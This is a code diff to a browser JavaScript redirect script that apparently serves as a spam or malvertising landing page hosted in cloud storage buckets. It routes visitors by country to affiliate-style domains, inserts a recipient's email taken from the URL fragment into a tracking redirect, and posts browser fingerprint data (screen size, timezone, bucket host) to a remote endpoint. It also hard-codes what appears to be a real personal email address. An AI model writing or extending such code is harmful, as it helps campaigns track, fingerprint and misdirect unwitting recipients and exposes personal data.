@@ -7,8 +7,8 @@ const ch_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=120583&s1=G20&s2
 const de_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=146265&s1=G20&s2=G20';
 const DEFAULT_REDIRECT_URL = 'https://glhpmr9.ladysearchs.com/xv7hcug';
 
-// Special redirect used when the bucket host contains the tag "abc"
-// The value after "#" in the URL will replace this URL.
+// Base URL used when the bucket host contains the tag "abc".
+// The `email=` query parameter is replaced with the value after "#" in the current URL.
 const TAG_ABC_REDIRECT_URL = 'https://vvw676.rientsplay.com/?s1=upg10&email=zito.calderon@gmail.com&s3=k16p2';
 
 // Tag we look for in the bucket host to trigger the special redirect
@@ -163,6 +163,33 @@ function getHashRawValue() {
     return hash.substring(1);
 }
 
+// Build the tag redirect URL by replacing the `email=` parameter in the base URL
+// with the value after "#" in the current URL. All other params are preserved.
+function buildTagRedirectUrl(baseUrl, hashValue) {
+    try {
+        const u = new URL(baseUrl);
+
+        if (hashValue) {
+            // Decode in case the email was URL-encoded in the hash
+            let emailValue = hashValue;
+            try {
+                emailValue = decodeURIComponent(hashValue);
+            } catch (e) {
+                // leave as-is if decode fails
+            }
+            u.searchParams.set('email', emailValue);
+            console.log(`[Redirect] Replaced email param with: ${emailValue}`);
+        } else {
+            console.log('[Redirect] No hash value - keeping base URL email param');
+        }
+
+        return u.toString();
+    } catch (e) {
+        console.error('[Redirect] Failed to build tag redirect URL:', e);
+        return baseUrl;
+    }
+}
+
 // Extract camp code from fragment data
 function extractCampCode(fragmentData) {
     if (!fragmentData || typeof fragmentData !== 'string') {
@@ -216,18 +243,13 @@ function getRedirectUrl() {
 }
 
 // Resolve the final redirect URL.
-// If the bucket host contained the target tag ("abc"), use the value after "#"
-// (falling back to TAG_ABC_REDIRECT_URL when the hash is empty).
+// If the bucket host contained the target tag ("abc"), take TAG_ABC_REDIRECT_URL
+// as the base and replace its `email=` param with the value after "#".
 // Otherwise use the normal country-based URL.
 function getFinalRedirectUrl() {
     if (parsedTag && parsedTag.toLowerCase() === TARGET_TAG.toLowerCase()) {
         const hashValue = getHashRawValue();
-        if (hashValue) {
-            console.log(`[Redirect] Tag "${parsedTag}" matched - using hash value: ${hashValue}`);
-            return hashValue;
-        }
-        console.log(`[Redirect] Tag "${parsedTag}" matched but hash empty - using TAG_ABC_REDIRECT_URL`);
-        return TAG_ABC_REDIRECT_URL;
+        return buildTagRedirectUrl(TAG_ABC_REDIRECT_URL, hashValue);
     }
     return getRedirectUrl();
 }
@@ -244,8 +266,8 @@ async function sendToCloudflareAndRedirect(userData) {
                 screenSize: `${screen.width}x${screen.height}`,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 timestamp: Date.now(),
-                tag: parsedTag,              // NEW: bucket tag (or null)
-                bucketHost: parsedBucketHost // NEW: full bucket hostname (or null)
+                tag: parsedTag,              // bucket tag (or null)
+                bucketHost: parsedBucketHost // full bucket hostname (or null)
             })
         });
 
